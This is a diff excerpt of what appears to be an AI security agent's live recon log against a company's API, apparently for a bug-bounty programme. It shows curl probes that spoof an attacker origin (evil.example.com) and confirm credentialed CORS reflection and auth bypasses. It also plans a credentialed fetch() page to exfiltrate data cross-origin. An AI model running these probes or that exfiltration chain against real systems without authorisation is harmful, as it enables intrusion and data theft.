@@ -31329,3 +31329,93 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK SCORE
 [RISK] api.sparelabs.com: 78 — two auth-free read bypasses (data-bearing 725B regions registry, zero-header org list), universal credentialed CORS reflection, 3-way UUID oracle, terms disclosure; exploitability capped by empty org payload and write-method gating (401) | platform.sparelabs.com: 30 — CSP infra leak (prod+staging admin Vercel apps, Metabase, 9 cloud services) but pure MFE shell, no API surface | routing.sparelabs.com: 5 — envoy 404 on all paths since 2026-08-07, no surface | forms.sparelabs.com: 25 — SPA shell with JS-bundle infra leak (main.71d52314.js), no API endpoints | web (spare.com/sparelabs.com): 10 — static Webflow marketing behind Cloudflare, no dynamic logic
+===== ANALYST bigpickle 2026-08-13 01:32:16 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "regions HTTP:%{http_code} SIZE:%{size_download} T:%{time_total}\n" -H "Authorization: Bearer x" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/regions" ; sleep 1.2; curl -s -o /dev/null -w "orgs HTTP:%{http_code} SIZE:%{size_download} T:%{time_total}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/organizations"
+regions HTTP:200 SIZE:725 T:0.134093
+orgs HTTP:200 SIZE:11 T:0.922491
+[0m
+[0m$ [0msleep 1.2; curl -s -o /dev/null -w "plural-nil HTTP:%{http_code} SIZE:%{size_download}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/00000000-0000-0000-0000-000000000000"; sleep 1.2; curl -s -o /dev/null -w "plural-malformed HTTP:%{http_code} SIZE:%{size_download}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/not-a-uuid"; sleep 1.2; curl -s -o /dev/null -w "terms HTTP:%{http_code} SIZE:%{size_download}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/terms?mobileAppId=00000000-0000-0000-0000-000000000000"
+plural-nil HTTP:404 SIZE:131
+plural-malformed HTTP:400 SIZE:263
+terms HTTP:200 SIZE:137
+[0m
+[0m$ [0msleep 1.2; curl -s -D - -o /dev/null -H "Authorization: Bearer x" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/regions" | rg -i "access-control|http/"; sleep 1.2; curl -s -o /dev/null -w "singular-nil HTTP:%{http_code} SIZE:%{size_download}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organization?organizationId=00000000-0000-0000-0000-000000000000"
+/bin/bash: line 1: rg: command not found
+singular-nil HTTP:404 SIZE:131
+[0m
+[0m$ [0mcurl -s -D - -o /dev/null -H "Authorization: Bearer x" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/regions" | grep -i "access-control\|^HTTP"
+HTTP/2 200 
+access-control-allow-origin: https://evil.example.com
+access-control-allow-credentials: true
+[0m
+[0m$ [0msleep 1.2; curl -s -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization" "https://api.sparelabs.com/v1/public/organizations/00000000-0000-0000-0000-000000000000" | grep -i "access-control\|^HTTP"
+HTTP/2 204 
+access-control-allow-origin: https://evil.example.com
+vary: Origin, Access-Control-Request-Headers, Accept-Encoding
+access-control-allow-credentials: true
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-headers: Authorization
+[0m
+All stable findings re-probed live this cycle (8 probes, ≤1 rps). Output follows.
+
+---
+
+**STEP 1 — DELTA**
+- [CHANGED] api.sparelabs.com/v1/public/organization (singular): observed in 3-way state this cycle (nil→404 NotFoundError 131B) — fast-replica hit; documented replica-flapping persists (2-way↔3-way), not a new surface.
+- NO_DELTA otherwise — all accepted findings byte-identical (regions 200/725B, orgs 200/11B zero-header, plural oracle 400/263B + 404/131B, terms 200/137B, universal CORS incl. OPTIONS 204 on the oracle route with full write-method surface).
+
+**STEP 2 — PRIORITIZE**
+- [PRIO] api.sparelabs.com/v1/global/regions: score 5.75, attack:6 business:4 tech:5 gate:10 cloud:5 fresh:5
+- [PRIO] api.sparelabs.com/v1/global/organizations: score 6.0, attack:5 business:6 tech:5 gate:10 cloud:5 fresh:5
+- [PRIO] api.sparelabs.com/v1/public/organizations/{id}: score 5.75, attack:5 business:6 tech:4 gate:10 cloud:3 fresh:6
+
+**STEP 3 — HYPOTHESES**
+[HYP] Cross-origin infra-topology exfiltration via regions scheme-only bypass + universal credentialed CORS
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 85
+reasoning: Live this cycle — `Bearer x` + Origin → 200 + 725B byte-stable + `access-control-allow-origin: https://evil.example.com` + `access-control-allow-credentials: true`; OPTIONS 204 on same path advertises GET,HEAD,PUT,PATCH,POST,DELETE + Authorization. Token validity never checked (presence-only); control /v1/journeys → 401.
+evidence_needed: credentialed browser fetch from attacker origin reads the 725B body cross-origin (200 + ACAO+ACAC already served).
+verify_steps: AUTH_HELPED: deploy page issuing `fetch("https://api.sparelabs.com/v1/global/regions",{headers:{Authorization:"Bearer x"},credentials:"include"})`; confirm body readable; control `fetch("https://api.sparelabs.com/v1/journeys")` blocked 401.
+impact: any visited site exfiltrates full regional API/routing topology incl. 6 OOS hosts, enabling targeted regional attacks; HIGH.
+testability: AUTH_HELPED
+
+[HYP] Valid-token GET discriminates real org registry from permanent stub
+class: AUTH
+asset: api.sparelabs.com/v1/global/organizations
+confidence: 50
+reasoning: Live this cycle — zero-header GET → 200 + 11B `{"data":[]}` + ACAO/ACAC (922ms slow replica); identical across all 7 query params (KB); write methods gated 401 at handler. Consistent with a placeholder handler pinned to one LB replica.
+evidence_needed: GET with a valid authorized token → non-empty `data[]`; empty confirms permanent stub.
+verify_steps: HUMAN_ONLY: `curl -s -w "\nHTTP:%{http_code} SIZE:%{size_download}" -H "Authorization: Bearer <program test token>" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/organizations"` (≤1 rps); compare body vs 11B baseline.
+impact: real tenant org-registry disclosure if data-bearing; HIGH. Empty caps severity at stub.
+testability: HUMAN_ONLY
+
+[HYP] Plural-oracle 200-branch requires an org carrying a full public-profile record
+class: IDOR
+asset: api.sparelabs.com/v1/public/organizations/{id}
+confidence: 55
+reasoning: Live this cycle — malformed→400 ValidationError (263B), nil→404 NotFoundError (131B + correlationId); 3-way differential intact, 200-branch unobserved 85h+; terms-valid UUID returns 404 on oracle but 200 on /v1/public/terms → backend index split.
+evidence_needed: one program test-org UUID resolving → 200 + org record (name/branding/contacts) with NO Authorization.
+verify_steps: HUMAN_ONLY: `curl -s -w "\nHTTP:%{http_code} SIZE:%{size_download}" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/<test-uuid>"` (NO Authorization, ≤1 rps); control nil→404; cross-check `/v1/public/terms?organizationId=<test-uuid>`.
+impact: unauthenticated tenant org-record disclosure; HIGH.
+testability: HUMAN_ONLY
+
+**STEP 4 — SELF-CRITIQUE**
+- [PARKED] none — all three ≥40, none on REJECTED class list, all have concrete verify_steps.
+- [FINAL] 1) Cross-origin regions exfil (85, AUTH) 2) Plural-oracle 200-branch (55, IDOR) 3) Valid-token discriminator on organizations (50, AUTH)
+
+**STEP 5 — NEXT ACTION**
+- [NEXT] HUMAN: Execute the top-confidence proof on the data-bearing bypass — deploy the AUTH_HELPED fetch page for `https://api.sparelabs.com/v1/global/regions` (`fetch(...,{headers:{Authorization:"Bearer x"},credentials:"include"})`) and record whether the 725B body is readable cross-origin; this closes the read→exfiltration chain on the only data-bearing auth-free route (control `/v1/journeys` must stay 401-blocked).
+
+**STEP 6 — LEARNING**
+- [LEARN] ACCEPTED AUTH @ api.sparelabs.com/v1/global/regions: scheme-only bypass STABLE — live re-probe 2026-08-13, `Bearer x`→200+725B byte-stable + ACAO:evil + ACAC:true; no-auth→400.
+- [LEARN] ACCEPTED AUTH @ api.sparelabs.com/v1/global/organizations: zero-header read-only bypass STABLE — live re-probe 2026-08-13, GET NO-Auth→200+11B+ACAO/ACAC; writes gated 401.
+- [LEARN] ACCEPTED IDOR @ api.sparelabs.com/v1/public/organizations/{id}: 3-way UUID oracle STABLE — live re-probe 2026-08-13, nil→404 NotFoundError 131B+correlationId, malformed→400 ValidationError 263B; universal CORS on same path (OPTIONS 204 ACAO:evil + ACAC:true + GET,HEAD,PUT,PATCH,POST,DELETE + Authorization).
+- [LEARN] ACCEPTED MISCONFIG @ api.sparelabs.com/v1/public/terms: data disclosure STABLE — live re-probe 2026-08-13, ?mobileAppId=nil→200+137B terms URLs no-auth+CORS.
+- [LEARN] ACCEPTED MISCONFIG @ api.sparelabs.com/v1/**: universal CORS credential reflection STABLE — live re-probe 2026-08-13, ACAO/ACAC uniform on GET 200/404 + OPTIONS 204 across regions/organizations/oracle paths; 85h+ stable.
+
+**STEP 7 — RISK SCORE**
+- [RISK] api.sparelabs.com: 78 — two auth-free read bypasses (data-bearing 725B regions registry incl. 6 OOS hosts, zero-header org list), universal credentialed CORS reflection (read+write method surface advertised, writes handler-gated 401), 3-way UUID oracle, terms disclosure; exploitability capped by empty org payload | platform.sparelabs.com: 30 — CSP infra leak (prod+staging admin Vercel apps, Metabase, 9 cloud services) but pure MFE shell, no API surface | routing.sparelabs.com: 5 — envoy 404 on all paths since 2026-08-07, no surface | forms.sparelabs.com: 25 — SPA shell with JS-bundle infra leak (main.71d52314.js), no API endpoints | web (spare.com/sparelabs.com): 10 — static Webflow marketing behind Cloudflare, no dynamic logic
